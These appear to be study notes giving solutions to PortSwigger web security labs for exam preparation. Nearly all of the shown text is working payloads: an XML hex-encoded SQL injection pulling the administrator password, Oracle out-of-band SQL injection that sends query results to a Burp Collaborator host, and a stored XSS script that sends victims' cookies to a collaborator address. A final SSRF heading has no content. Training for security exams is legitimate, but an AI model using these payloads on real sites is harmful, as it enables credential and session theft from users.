"These labs have been selected because they reinforce core web security testing skills - such as understanding encodings and using them to evade defences, and proficiency in exploiting cross-user attacks. These specific labs support your exam preparation in terms of skill development, but they are in no way a list of the components you'll be expected to solve to complete the exam."

# [0x1] Lab: SQL injection with filter bypass via XML encoding
You will need [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) Burp Suite Extension
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
      <productId>
        2
      </productId>
    <storeId>
      <@hex_entities>
        1 union select password from users where username='administrator' 
      <@/hex_entities>
    </storeId>
  </stockCheck>
```

# [0x2] Lab: Blind SQL injection with out-of-band data exfiltration
### Identify vulnerability:
```sql
aaxaxa'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://x.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual-- 
```
Control + U for URL Encoding and SEND

### Data exfiltration
```sql
'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```
Control + U for URL Encoding and SEND

# [0x3] Lab: Exploiting cross-site scripting to steal cookies 
A simulated victim user views all comments after they are posted.<br>
Write this payload into comment section:
```js
<script> document.location = "http://<BURP-COLLABORATOR>/?" + document.cookie </script>
```

# [0x4] Lab: SSRF with blacklist-based input filter
